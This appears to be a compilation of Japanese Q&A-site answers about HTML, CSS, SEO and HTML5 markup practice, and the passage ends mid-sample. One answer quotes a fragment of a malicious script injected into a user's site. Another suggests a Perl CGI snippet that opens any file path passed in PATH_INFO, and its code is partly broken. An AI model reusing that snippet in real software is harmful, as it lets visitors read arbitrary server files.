@niftyホームページサービス - ホームページ作成なら@niftyホームページサービスで！ ( http://homepage.nifty.com/ ) 　とか。ご利用のISPの定額サービスを探されるのがよろしいかと・・・ 　なお、送信は<input type="submit" ***ですよ。
　firefoxをお使いでしたら、Live HTTP headers( https://addons.mozilla.jp/firefox/details/3829 )でサーバーとの交信を確認してください。 　CSSもHTMLもたいした量ではないので、それらが足を引っ張っているとは考えにくいです。スタイルシートに限らず、HTMLから呼び出している多くのファイル--特に画像や動画も関係しています。 　ブラウザはいったんHTMLを読み込んだ後、HTMLを解釈して必要なものは、それらを逐次サーバーに要求して行き、揃ったものから描画に使用していきます。 　画像を読み込まないLynxなどのテキストブラウザでHTMLやCSSを開いてみても良いでしょう。
何を聞きたいのか良くわからないけれど間違いじゃないよ。 divという大枠のblockに ul,p,ul という3つのblockを内包している　ってだけ。
標準モードでは、それが正しい処理ですね。 tableのwidth:プロパティのデフォルトはautoですから ところでされたいことが、つかめないのですが、 tdがひとつしかないときは、tableの巾は？ tdが、二つのときは、tableの巾は？　170px×2 = 340px ＜ 300px（div巾) tdが、さらに大きいときは？ そもそも、なぜ oveflow:hiddenでなければならないか？？、それじゃ内容が見えなくなりますけど・・
どのページから訪問したかは、HTTP要求ヘッダのHTTP_REFERERにありますから、それを参照してページを生成するのが通常の方法です。 　それ以外に、cookieやQUERY_STRING、PATH_INFOといった手法があります。それぞれに、長所・短所があります。 HTTP_REFERER --referrer---は、意図的に隠したり偽証できる。セキュリティソフトにはこれをブロックするものがある。検索エンジンによると、これを提出するものがあるので検索エンジンからは隠せないことがある。検索エンジンに対してROBOT.TXTなどでクロールを制限する必要がある。 cookie cookieの取得提出を拒否しているユーザーが存在する。 QUERY_STRING/PATH_INFOとも、URLの一種なので限界がある。 　もっとも良いのは、basic認証などでパスワードによる制限をかけることでしょう。 　それぞれ、ここで説明するには膨大な量になるし、適切ではありませんので検索してください。
はみ出すというのは、左カラム下部の「私たちが責任を持って～」以下の部分でしょうか。 直前の<table>タグに書き込まれている「align="left"」を外せば 回り込みが解除されますよ。
border-right: 1px double #fff; でいかが？ （double　と　#fff　の間にスペース挿入）
製作予定のサイトを、卒業制作として提出した後でも対外的に運用する（公開して一般の人にその機能を使ってもらう）気があるのであれば別ですが、そうではなく「提出して終了」だったら >要するに『今まで参考書等で勉強し頭で理解してきたそのロジックを >卒業制作という機会を通じて自分なりの形として実現』したいのです。 これをそのままテーマ・コンセプトとしても良いのでは？ 運営者が興味のもてないことを無理やりテーマにしても、そのうち放置・閉鎖になるだけです。 個人運営の技術系（というか「技術の獲得・検証を記録した」）ｗｅｂサイトなんて幾つもありますから問題ないと思いますよ。
ある程度のSEOを頑張っているのなら、後はコツコツ努力するのみです。 良い記事を書き、良いサイトを作るようにしましょう。 もしかしたら、あなたがやっているSEO対策は間違っているかもしれません。 詳しいSEO対策についてはブログで学ぶのが良いですよ。 初心者の方にもオススメです。
回答は、運用しているサイトが専用サーバや VPS じゃないこと前提ね。 もし、専用サーバや VPS なら補足に追記して、ほかのひとの回答を待ってね。 <--[質問] より引用 １ FireFoxで運営ホームページにアクセすると 「攻撃サイトとして報告されています」との表示 --> まずは、情報収集。 サーバを運営している会社に、問い合わせてみるといいよ！ 他の利用者からも問い合わせが、あったかもしれないしね。 <--[質問] より引用 ２ IEを使用しソースを見ると<!-- ad --><script>c=3-1;i=-1-1+c;p (（中略） </script><!-- /ad -->が挿入されている。 --> もしかして、無料のレンタルサーバ？ もしそうなら、ただの広告欄かも？ 運営してるページの URL って http://ユーザ名.example.com/ じゃなくて http://www.example.com/ユーザ名/ じゃない？ もしそうなら、ほかの利用者がウィルスにかかってるのかもね。 あと、google からのメールは、google に問い合わせるといいよ！
１．大きな画像を使わずに、ＣＳＳを工夫するだけで結構軽くすることが出来ます。 　　あとは、画像を保存するときに、サイズが軽くなるように保存するのもいいと思います。 　　（画像が荒れてしまいますが、、、） 　　最新の携帯では、重いファイルでも問題なく見れると思いますが、 　　古い携帯ではページを開くことすら出来なくなってしまうこともあります。 　　なるべくファイルが軽くなるように作ることをオススメします。 ２．携帯では扱ったことがないのでちょっと詳しいことは分かりません。。 　　youtubeのサイトでは、iframeのコードを取得できるので、それを入れたらＰＣでは 　　きちんと再生することが出来ました。 ３．Tableタグはできることならやめた方が無難です。 　　携帯の種類は本当にいっぱいあって、スマートフォンも含めたらかなりの数になります。 　　機種によって画面の横幅のサイズも違ってくるので、 　　出来ればTableではなく、ＣＳＳでデザインを組んだ方がいいと思います。 　　スタイルシート、難しいですよね。 　　こんなサイトがオススメだと思います。 　　　http://www.tagindex.com/stylesheet/link/color.html 4. 見出しなどはCenter、長い文章は左寄せにするなど、 　　実機で確認しながらページを組んでいくのがオススメです。 　　特に決まりはないので、ページが見やすければどちらでも大丈夫だと思います。
＞詳細度について勉強してみました。 ＞http://www6.plala.or.jp/go_west/nextcss/ref/basi … ＞ここを参照してみましたが、 　そのサイトの説明はCSS2です。現在ウェブ標準として認識されているものはCSS2.1です。CSS2.1では、詳細度の値に変更があります。 →6.4.3 Calculating a selector's specificity ( http://www.w3.org/TR/CSS2/cascade.html#specificity ) 全称セレクタ,HTMLの要素での指定 　詳細度 0 要素セレクタ,擬似要素セレクタ 　　詳細度 d=1 クラスセレクタ,擬似クラスセレクタ 詳細度 c=1 一意セレクタ　　　　　　　　　　　詳細度 b=1 HTMLのstyle要素　　　　　　　　　 詳細度 a=1 　つねに、詳細度を含めたプロパティの値,カスケーディング,継承については意識しておかなければなりません。 　→Assigning property values, Cascading, and Inheritance ( http://www.w3.org/TR/CSS2/cascade.html ) 　残念ながら、スタイルシートを説明している多くのサイトは、プロパティの説明に多くを裂いていて、それ以前に知っておかなければならない継承や詳細度の計算を含むカスケーディングについてはほとんど無視されているのが実情です。CSS(カスケーディングスタイルシート)と銘打つくらいカスケーディングは重要ですのに・・・ ＞一意なので#だけでよいです。 ＞こちらについても理解できませんでした。#だけでいいとは#{...}という事・・・ではないですよね。 　そうです。 #headeは、CSS2では、*#headeと解釈され、詳細度は[ 0 1 0 0 ]となりますが、他のセレクタの指定方法と同じく　*#heade[ 0 1 0 0 ]と書くべきなのでしょうが、所詮ページ内に一箇所しかないので、#headで良いかなと。 　classはページ内のあちこちに存在しうるので、基本的に記述するほうが良いです。(後々楽と言う意味で) ＞もしあっているのならbody{margin:0;}ではなく*{margin:0;}の方がいいように思います。 　これは違います。*全称セレクタは、すべての要素セレクタを示しますから、本来継承されないmarginをすべての要素に適用させてしまいますから、まずいです。継承されるプロパティについては、body{font-family:・・・・・}ですべてのbody以下の要素に適用されますから、この場合も書かなくて済む。 　よく見かける *{margin:0;padding:0;} 　と言う指定は、ul,ol,dl,blockquote,p・・などの、ブラウザの持つデフォルトスタイルシート（default style sheet）-- http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … --を上書きしてしまいますから、これらが登場すると再設定しなければならなくなります。これはスタイルシートを煩雑にする大きな要因になることは理解できると思います。 　基点となるセレクタになりうるのは、*とタイプセレクタです。CSS2では、基点となるセレクタと言う概念が導入されたため、*が追加されたと考えると良いでしょう。
まったく関係ありません。 考えても御覧なさい・・・検索エンジンは作者ためではなく、利用者のためです。そのため検索キーワードや住まいの地域などあらゆる情報を元に、もっとも適したページを探し出して並べてくれるものです。 　とてつもない下位ディレクトリにあるページであっても、 ・そのページにまさにその情報がある と判断されれば、上位に表示されるべきです。 　検索エンジンがそのように判断できるためには、 きちんと文書構造に従ってマークアップされているか？ へんな細工をしていないか 　など、検索エンジン最適化(SEO)が必要なだけです。 ウェブマスター向けガイドライン ( http://support.google.com/webmasters/bin/answer. … )
基本的にそのような目的にjavascriptは決して使いません。ヘッダー部分は、検索エンジンが最初に解釈する部分ですが、検索エンジンはjavascriptなんて理解しません。検索エンジンどころかjavascriptでドキュメントの書き換えを禁止しているユーザーや、そもそもjavascriptを解釈しないユーザーエージェントには無意味です。 　高機能なテキストエディタで、一挙に書き換えるほうが断然早いし簡単です。 /^\t<div class="header">.*$\t<\/div>/$header/s; とか・・・・・もちろんPerlを使っても良い。 　もちろん、一番簡単なのはサーバー側で書き換えることですが・・phpもSSIも使わず、簡単なCGIだけで・・ .htaccess AddType application/x-httpd-cgi html; とでもして html　は単純なCGIで内容は open FILE,$ENV{'PATH_INFO'}; while(<FILE>){ s/__HEADER__/$header; s/__FOOTER__/$footer; print; } とか・・・
<div>や<img>でも出来ますし、<canvas>でも出来ますし、<svg>でも出来ます。 <div>の弱点は、動的に斜線や曲線を引くことが出来ないことに有ります。 あらかじめサイズが決まっていれば<img>で作ることが出来ますが、 「その場で斜線の太さや長さ、角度を決める」ということができませんので、そういう作業が多いグラフ描画などはCANVASやSVGが使われます。 動的に<img>を作り出すものが<canvas>です。 img.src="make_graph.cgi?"+parameter; などと、CGIでグラフを作り<img>に描画する方法が使われていましたが、 サーバーの負荷が高いですし、ゲームのような即時性が必要なものでは使えません。 SVGが使われない理由は、単にブラウザがサポートしていないからです。 （または、サポート状態が悪くて使い物にならないからです。） ----------- いろいろなブラウザの独自実装を一つにまとめようと言うのがHTML5です。 他のブラウザの独自実装を取り込もうというようなものですので、全てのブラウザが全ての機能をサポートできるようになるには、相当な時間がかかります。 IEでcanvasを使うためにはIE9が必要ですが、WindowsXPではIE9は動きません。 SafariでAjaxを使うためには、Safari1.2以上が必要ですが、Safari1.2はMacOS X 10.3が必要です。 MacOS X 10.2、Safari1.2は「古いブラウザ」「古いブラウザ」として考慮する必要は有りませんが、 WindowsXP、IE8はまだまだ現役ですから、これらのOS、ブラウザ（のバージョン）が「古い」「全く使われなくなった」と言われるまでは、完全移行は待ってもいいかもしれません。 ただし、提示されているようなゲームなど、 Webアプリケーションのジャンルでは、互換性を考慮する必要がないと思います。 （この場合の『Webアプリケーション』の対義は『HTMLドキュメント』） ネイティブアプリでは、WindowsアプリとMacアプリ、iPhoneアプリ、DoCoMoアプリ、、、等々、特定の環境のみ動くアプリケーションが多いです。 同様にWebアプリにおいても、Chromeアプリ、IEアプリ、Operaアプリ、、、等々、特定の環境のみ動くものであっても、私は問題ないと思います。 もちろん、「より多くの人に使ってもらいたい」というのであれば、それぞれの環境に移植する方がいいとは思いますけどね。 とくにブラウザ間は比較的移植しやすいですから。
末席ながら投稿させて頂きます。 ジェネレーター（ビルダー）でソースを作れば汚くなります。 ヤフーとかgooとかの大手サイトも褒められたものではないそうです。 テーブルとはテーブル組のことですね。ボックスはCSSで作るべきです。 既にHTML5ではheader、navi、article等のタグが用意されています。 これらはdivがそれぞれ専用のタグに変更になったものです。 テーブルでのデザインは10年以上昔のものです。 ただ、指しているテーブルが本当の意味での表ならば、 勿論テーブルで作るべきです。その場合もCSSは必須でしょう。
BM がブックマークとわかるのにかなり悩んだ。。。 自分語(造語)は、他人を悩ませるよ？ http://ja.wikipedia.org/wiki/BM <!--[質問]から引用 BMやURL直打ちでサイトに行ったときと、更新ボタンを押したときは htmlの読み込み方が違うのでしょうか？ --> いろいろ違うよ？ Referrer とかキャッシュとか、他にも。 HTML+JavaScript のソースか、せめて、使ってるスライドショーの JavaScript ライブラリの名前を書かないとね！ これで答えられたら超能力者だとおもう。ある意味すごい。
「ホームページを作るだけで公開しない」であれば、サーバーの利用を申し込む必要は有りませんが、 「ホームページを作って公開する」であれば、申し込みが必要です。 インターネットの接続業者によっては、接続の申し込みと同時にホームページ公開サービスもついていることがありますから、 そのサービスを利用すれば、新たに契約する必要はありません。
大丈夫ですよ しかしなぜあえてXHTM1.0で使うのかが不思議です 俗に言うXHTML5を使うのはどうでしょう？
「後方互換性～」の件を考慮するなら、将来廃止になる可能性を考えてid属性を使用します。 しかしHTML5ではformのname属性が非推奨でなくなる可能性があるように思えるのです。 その理由と、name属性が非推奨でない場合にどう使い分けるかを述べます。 あくまで臆測なので、実際に今から開発するならid属性を使用します。 ■formのname属性が非推奨でなくなる可能性 ANo2にあるように、HTML4の仕様書には「この属性は後方互換性～」の注意書きがあります。 しかし、現在草案段階のHTML5の仕様書にはそれが見つかりません。 また、HTML4であってもformのname属性は「非推奨」ではありません。あくまでANo2さんが紹介している「注意書き」だけです。 XHTMLでは非推奨だったり廃止だったりしますが、XHTMLとHTMLは別物と思った方がいいでしょう。実際、W3CはXHTML2の策定を打ち切りHTML5の標準化に注力しています。 そこで、注意書きが無くなったから注意する必要がなくなった(非推奨ではなくなった)、という推測が立つわけです。 「HTML5 における HTML4 からの変更点」の「3.4. 変更された属性」項には「以前は非推奨だったが非推奨でなくなった」属性が記述されています。もともと非推奨でないname属性はこの中にはありませんが、このような変更があるということが先の推測を後押しします。 http://standards.mitsue.co.jp/resources/w3c/TR/h … ■id属性とname属性の使い分け ANo6にあるように、HTML5からid属性とname属性には明確な違いが出来ました。それを基に考えます。 【命名】 「formのname属性はform内で一意になればよい」この範囲の狭さは命名をする上でid属性より有利に働きます。 「id属性は全要素内で一意にならなければならない」これはすべての要素を考慮した名前を付ける必要があるということです。 例えば、ユーザー登録画面にformと登録ボタンがあるとします。 登録ボタンのidをentryとすれば、formのidをentryには出来なくなります。なのでentryButton, entryFormのように命名したりします。 名前というのは長くなるほど決めずらいものです。entryFormにしても、他にentryFrmやfrmEntryというパターンが考えられます。どのような命名規則にするかのルール決めが必要で、これがなかなか面倒なのです。 それがname属性であれば、どちらもentryと名付けられるのです。シンプルです。cssからの指定はform[name="entry"]のようにします。 【指定】 先の命名から続いて登録画面を考えます。「ボタンを一意に指定して色付けしたい」となったときそれぞれcssでは以下のように指定します。 #entryButton {color: red} form[name="entry"] button[name="entry"] {color: red} idの利点は短いことです。説明の必要はないでしょう。 nameの利点は要素を明確にせざるを得ないことです。 例えば以下のおかしなcss #entryButton td {color: red} form[name="entry"] button[name="entry"] td {color: red} これをバグだと判断できるのはname属性の方だけです。(button要素の下にtd要素は置けない) id属性の方はそれがtr要素に付いている可能性もあり、htmlを見ないことには判断ができません。 name属性の方がバグ探索に掛る手間が少ないのです。 id属性の方でもbutton#entryButtonとすれば同じですが、name属性の方はそれを強制できるという点が利点とも欠点とも言えます。 また、これはバグについていえば利点ですが、変更し易さでいえば欠点になります。(<button>ではなく<inputtype="button">に変更した場合とか) 【手段と目的】 formを一意にするためにはid属性を使用します。name属性ではありません。 このことはHTML5で登場する「form属性」が示唆を与えてくれます。 これはform要素外にinput要素などを配置可能にしてくれる属性です。 以下のようにすることで、input要素をform外に置くことが出来るのです。 <form id="entryForm"></form> <input type="text" name="userName" form="entryForm" /> http://www.marguerite.jp/Nihongo/WWW/RefHTML5/At … このform属性にはform要素のidを指定しなければなりません。nameは指定できないのです。 このことから、form要素を一意にする為にはid属性を使うべきだと思われます。 ではform要素のname属性は何に使うかですが、あえて使い分けるなら「id属性に出来ることをしないことを示す」為に利用します。 id属性ではなくname属性を使う事で、form外にinput要素が無い事を示せます。これはソースコードを読む上で役に立つ情報だと思います。 もう少し突き進めるなら、コードには表れない含意になりますが、「form要素の子要素を一意にする」為だけに利用します。 こうすることで、id属性と意味が重なっていた「form要素を一意にする」という部分が大幅に薄れます。 実際のコード上では以下のように利用することはあっても、 form[name="entry"] button[name="entry"]{ color: red} 以下のようには利用しない、 form[name="entry"] {color: red} ということを含意させるのです。 そうすれば例えば、submitボタンを押して画面が真っ白になるバグに遭遇したときに、「form要素のaction属性にjavascriptから変更が及ぶことはない」とか考えて、バグの探索を短縮できるかもしれません。 【結論】 「form属性」のようなid指定が必要な属性が将来的に増えてくることを考えると、form要素を一意にする為にはid属性を使った方が無難だと思います。 ■蛇足 - inputのname属性について HTML5から新属性としてlabel要素にfor属性が加わりました。 このfor属性にidを指定することで、label要素外に対象となる要素を配置可能にします。 以下のような形です。 <label for="chk">ラベル</label> <input type="checkbox" id="chk" /> これでも通常のラベルと同じように動作するのです。(画面に表示された「ラベル」という文字をクリックすることでチェックボックスのOnOffを切り替えられる) これはデザインをする上で便利だったりするのですが、form属性と同じようにname属性は指定できません。id属性しかだめなのです。 それは当然のことです。inputのname属性はformが違えば名前を重複できるのですから、一意に指定する際には利用できないのです。 このことに対して私は憤りを感じました。 inputのname属性は便利です。 例えば、ユーザー登録画面とログイン画面が一体化したような画面では、登録用とログイン用の2つのformが必要になります。 それぞれの中には同じようにuserNameとpasswordがあるわけですが、これがinputにid属性しか使えないとなるとuserNameは2つあるのでuserName, userName2なんていう命名をしなくてはならない羽目になります。これは中々に面倒です。 どちらもuserNameと命名したいのが人情です。それをname属性は満たしてくれます。 cssで以下のようにして一括でデザインが与えられるのです。 input[name="userName"]{ color: red } つまりformが違えば同じnameを使えるというのは私にとっては大きな利点なのです。 その上で一意指定もしたい。一意指定が必要な機会は中々に多くある。と考えると、inputのname属性を活かす為に、form要素に名前を付けることは必然のことだ、と思われました。 そのためにこそ、id属性という汎用属性ではなく、name属性という固有の属性が生き残ったのではないかと思ったのです。 もしform属性とfor属性が以下のように指定できれば、私の期待は達成されたでしょう。しかし現実は違いました。 <form name="frm"></form> <label form="frm" for="chk">ラベル</label> <input type="checkbox" form="frm" name="chk" /> 現状、for属性がこんなことでありながら、input要素のname属性は残り続けています。 fieldset要素なんてのも出てきました。将来的にはチェックボックスのグループ化の為に同じnameを付ける必要がなくなるかもしれません。 HTMLでもname属性はid属性に乗っ取られる予定なのかもしれません。
まるまる Flash とかのサイトじゃないのなら、[ANo.3] さんのいうように、10年先でも 20年先でも、無理して HTML5 にする必要はないと思うよ？ PC 向けには、IE8 がもうほとんど使われなくなっている頃(Windows Vista がサポート終了になるころ？)を目標に、Flash から SVG か Canvas に乗せかえればいいだけだから。 スマートフォン向けには、もう Canvas でいいんじゃない？ SVG は、Android 4 が浸透してからかな？ ちなみに、Canvas と SVG は、 SVG ↑ Canvas の関係ね。Canvas で SVG は表現できるけど、SVG は Canvas にはなれない。 『なら、全部 Canvas ？』 ということじゃなくて、SVG で書いたほうが楽なこともあるよ。 Canvas はプログラムが必要だけど、SVG は XML を書けばいいだけだからね。
大きなものを小さな箱に入ることはできませんが、 どんな風に対策したいのですか？ 横に並べることが出来なければ縦に並べるのも、対策としては十分ではないでしょうか。
画像やテキストがそれぞれ何なのかによってHTMLは、まったく異なったものになります。 たとえば、それが商品とその説明のリストでしたら <ul><!-- 順不同リスト、順番があるならol --> 　<li><img 画像---> 　　　<p>説明文</p> 　</li> 　<li><img 画像---> 　　　<p>説明文</p> 　</li> 　<li><img 画像---> 　　　<p>説明文</p> 　</li> </ul> 　その上で、どのように表示したいかをスタイルシートで決めていきます。
　HTML5で廃止される--3.5. 不在の要素 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … )は、基本的に使いません。 要素をすべて書き出して、私がよく使う順に並べてみました。 必ず使うもの 　<HTML> <TITLE> <BODY> <HEAD> <META> <LINK> <STYLE> <H1> <H2> <H3> <P> <A> <OBJECT> <IMG> <STRONG> <EM> <DIV> <SPAN> <HR> 必要に応じてよく使う 　<DL> <DT> <DD> <OL> <UL> <LI> <BLOCKQUOTE> <Q> <PRE> <TABLE> <TBODY> <TR> <TH> <TD> <THEAD> <TFOOT> <CAPTION> <ADDRESS> <COL> <COLGROUP> <H4> <H5> <H6> <SCRIPT> フォームのときだけ 　<FORM> <INPUT> <OPTION> <SELECT> <TEXTAREA> <BUTTON> <OPTGROUP> めったに使わない・・本当に必要なとき 　<SUB> <SUP> <ABBR> <AREA> <BASE> <BDO> <BR> <CITE> <CODE> <DEL> <DFN> <FIELDSET> <INS> <KBD> <LABEL> <LEGEND> <MAP> <NOSCRIPT> <PARAM> <SAMP> <SMALL> <VAR> <IFRAME> 　 絶対に使わない <B> <BIG> <I> <TT> <ACRONYM> <APPLET> <BASEFONT> <CENTER> <DIR> <FONT> <FRAME> <FRAMESET> <ISINDEX> <MENUE> <NOFRAMES> <S> <STRIKE> <U>
こんにちは。 動作サンプルを作ってみましたのでリンク先よりソースを見てみてください。 一応、できる限りのコメントをソース内に記述しましたので参考にしてください。 ==== 動作サンプル http://hppg.moe.hm/okwave/qa/q7425918/
(1.5mm＋3.0mm)÷2＝2.25mm ≒ 0.09インチ Windows は 96dpi だから、 96dot/inch×0.09inch＝8.64dot つまり、縦横 8ピクセルで、鮮明に見える日本語明朝体フォントかぁ さすがに見たことないなぁ。。。 3 mm だったとしても、縦横 11ピクセル。 アンチエイリアシングしても、ちょっと無理があるね。 あとは、複雑な漢字を使わないで、かな表記にすれば、何とかなるかもね。
＞action="info@00000.com" が変じゃないですか？ クライアントのメーラーで送りたいのか サーバー側で送りたいのか どちらの要件も満たしていないように見えますが・・・
No.2です。先にいずれも誤りと説明しましたが、修正すると (1)<font size="2" color="#bfbfbf">灰色</font> (2)<font size="2" color="#bfbfbf">灰色</font> (3)<font size="2"><font color="#bfbfbf">灰色</font></font> ★ですかね。(HTMLでは大文字小文字の区別はしません。<font>は開始タグ、閉じタグが共に必要です。 　→Index of the HTML 4 Elements ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　まあ、いずれにしても使うことありません。私も10年近く使った経験が無い。 「2.4.1 構造とプレゼンテーションの分離 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 「一般的に言って、スタイルやフォーマットを整えるためには、HTMLのプレゼンテーション属性ではなくスタイルシートを使用すべきである。スタイルシートによる代替が可能なHTMLのプレゼンテーション属性は、推奨しないこととなった。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 「スタイルシートはこれらの問題を解決すると同時に、HTMLにおける制限されたプレゼンテーション機構に取ってかわる。スタイルシートでは、行間の設定やインデントの設定、テキスト色や背景色、フォントのサイズとスタイル、その他様々なプロパティの設定が簡単にできる。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 ＞フォントは使わない方がいいということですか。 　「4.1 定義 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」をしっかり読んでください。遠まわしですが、 著者は、strictで、ブラウザはtransitinalを解釈しろ！と書いてある。HTML5では、よりはっきりと ★著者が使えるもの ★ブラウザが解釈すべきもの 　と明確に強く指定されていて、<font>などは使えません。 　HTML5--3.5. 不在の要素 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … ) 　HTML5--3.6. 不在の属性 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … ) 　これらの要素・属性はHTML4.01の時代からすでに非推奨のものばかりです。これらを使って説明している参考書・資料は見ないようにしましょう。 　
１つ簡単にアドバイスさせてもらうと JS、Flash、JAVA、例えどれででもできることでも、何を使うべきかはいろんな理由で変わってきます。 一般的に現状まだプラグインのほうが無難ですが、HTML5は将来性が非常に大きいです。 もう大手がHTML5に力を入れ始めてるのは、それがベストだからというよりその将来性を見越してのものです。
JavaScriptで書くとこんな感じです。 オートページャー（javascript AutoPage）で検索すると、 それらしいJSがいろいろとでてくると思います。 <!DOCTYPE html> <html> <head> <meta charset="UTF-8"> <style type="text/css"> header{ border-bottom:1px solid #000; } ul{ margin:0; padding:0; list-style:none; } ul#contents{ width:100%; } ul#contents > li{ margin:0; padding:0; width:100%; background:#fff; } ul#contents > li ul li, ul#contents > li p{ margin:0; padding:0; border-bottom:1px solid #000; } footer{ border-top:1px solid #000; } </style> </head> <body> <header>ヘッダ</header> <ul id="contents"> <li> <ul> <li><a href="#">リンク01</a></li> <li><a href="#">リンク02</a></li> <li><a href="#">リンク03</a></li> <li><a href="#">リンク04</a></li> <li><a href="#">リンク05</a></li> </ul> </li> <li> <ul> <li><a href="#">リンク06</a></li> <li><a href="#">リンク07</a></li> <li><a href="#">リンク08</a></li> <li><a href="#">リンク09</a></li> <li><a href="#">リンク10</a></li> </ul> </li> <li> <ul> <li><a href="#">リンク11</a></li> <li><a href="#">リンク12</a></li> <li><a href="#">リンク13</a></li> <li><a href="#">リンク14</a></li> <li><a href="#">リンク15</a></li> </ul> </li> </ul> <p id="page"><a href="#" onclick="nextContents();return false;">次の5件</a></p> <footer>フッタ</footer> <script type="text/javascript"> var count = 1; var contents = document.getElementById('contents'); var childs = contents.childNodes; var list = new Array(); for(var i=0,j=0;i<childs.length;i++){ if(childs[i].nodeType == 1){ list[j] = childs[i]; if(j > 0){ list[j].style.display = 'none'; } j++; } } if(list.length < 2){ document.getElementById('page').style.display = 'none'; } function nextContents(){ list[count].style.display = 'block'; count++; if(list.length <= count){ document.getElementById('page').style.display = 'none'; } } </script> </body> </html>
今までのことはすっぱり忘れて、本当に基礎からやり直してください。きついようですが、それが一番早くて上達への近道です。 1) HTMLは文書をそれを構成する要素に分解して、それがどのような要素であるかをタグを使ってマークアップするものです。!!!文書の構造であってデザインではありません。 　たとえば、見出しはそのレベルによって<h1>～<h6>、段落は<p></p>で、リストは<ul>や<lol>と言う風に・・ 　これらで足りないときは、<div>(汎用ブロック要素)や<span>(汎用行内要素)にclassやidをつけてマークアップします。たとえば文書のヘッダでしたら<div class="header">、本文なら<div class="section">というふうに、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［The global structure of an HTML document (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より <div id="top"><-- idはリンクのターゲットに使うことに限定するほうが良い --> <div id="tops"><!-- idなんて不要 --> <br style="clear:both" /><!-- brは通常は使わない使うべきではない --> <div id="left"><!-- leftなんて文書構造上意味のない名前はつけない --> <div id="menu1"> ・・・【中略】・・・ <div id="menu6"><!-- いちいちリンク先でもないのにidはつけない、またナビゲーションならclass名はnav --> <div id="middle">更新履歴など<!-- ならfooterでしょ --> <div id="right"><!-- これは更新履歴などフッタより前に登場すべき内容では?? <div id="under"><!-- こんなidはつけるな --> ★XHTMLではなく、HTML4.01のstrictをまなぴましょう。世の中XHTMLだといっていたのは遠い昔の話です。HTML5の登場で重要なのはHTML4.01strictです。 ★次の回答で、ウエブ標準の具体的な実例を挙げておきます。そのソースを見ればこれらの説明の意味がよくわかるでしょう。 　なお、本気で最短で最善の方法をお探しなら ★はじめてのWebドキュメントづくり ( http://www.asahi-net.or.jp/%7Esd5a-ucd/www/ ) を一通り学んだ後 ★HTML 4.01 Specification (ja) ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )をすべて目を通すこと。覚えなくて良いです。とにかく通して読んでおくこと。そこにも書かれていますが、まずstrictだけを学ぶこと。決してtransitinalには目もくれないこと。(あなたはXHTML1.0transitinalですが、それはHTML4.01transitinalと実質同じもので、過去の遺物です) ★とても参考になるのは「HTML5 における HTML4 からの変更点 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … )」の新しい要素とその説明です。
インターネットをガラケーや某掲示板と一緒にしないで！ パブリックな場所に適した文字をつかおう！ ちなみに、半角カナは、パブリックな場所でつかうようなものじゃないよ？ あと、英語圏の人も自動翻訳検索とかで、みることもあるから、全角英数字も、使わない方がいいかな？
#1 の方も仰る通り、mailto: は環境依存性の高いスキームなのでその解決法としてメールフォームがよく利用されています。 mailto を使用するとスパムの標的になりやすいという理由からメールアドレスを画像化するサイトも多いですが、スマートフォンやタブレットなどの入力が制限されるAndroid端末で画像化を採用するメリットは少ないでしょうね。 メールアドレスのHTMLエンティティ化で目くらましにはなりますが、原理的には機械的にデコード可能なので特定されるのは時間の問題だと思います。 To: #1 ORUKA1951 さん mailto: は URL です。誤りではありません。 http://www.ietf.org/rfc/rfc2368.txt Android OS 上で動作しないのならそれはブラウザ又はメーラーが対応していないからです。 環境が整っていないので使うべきではないという意味では同意しますが、mailto 自体が誤りなのではありません。 また、仕様を出すなら HTML5 がより詳しいでしょう。最終的には RFC3986 が参照されています。 http://www.whatwg.org/specs/web-apps/current-wor … HTML 4.01 では RFC1808 への参照に繋がり、mailto にも触れられています。 http://www.ietf.org/rfc/rfc1808.txt 細かいことをいえば HTML 4.01 では「URL」ではなく「URI」という表記になっているはずです。 HTML5 では「URL」の用語定義が見直されているのでややこしいですが…。 http://detail.chiebukuro.yahoo.co.jp/qa/question …
とっても古い参考書を利用されているようです。 <table border="1" summary="何とかの表"><!-- summaryは必須 --> 　　<tbody><!-- tbodyは原則必須です --> 　　　　<tr> 　　　　　　<td colspan="2">１</td> 　　　　</tr> 　　　　<tr> 　　　　　　<td colspan="2">２</td> 　　　　</tr> 　　　　<tr> 　　　　　　<td>３</td><td>４</td> 　　　　</td> 　　</tbody> </table> ※上記HTMLは見やすくするため全角スペースでインデントさせています。全角スペースはタブや半角スペースに置換してください。 　として、スタイルシートで、背景の黒、tableの背景色を指定します。tableをデザインのために使用してはなりません。 『単に文書内容を整形する目的だけで表を用いるべきでない。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 『ページレイアウトの目的で表を用いる。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 cellspacing ,cellpadding,bgcolor,cellspacingはすべて非推奨です。 →11 表 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　次期HTML5では、使えなくなります。 ★Another HTML-lint gateway ( http://openlab.ring.gr.jp/k16/htmllint/htmllint. … ) 　でチェック済みのウェブ標準のサンプルです。 　なお、タブは＿に置換してあります。---HTMLはとってもシンプルで簡単でしょ。あとはスタイルシートを覚えましょう。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- div.section{ background-color:black; width:230px;margin:0 auto; padding:10px 0; } 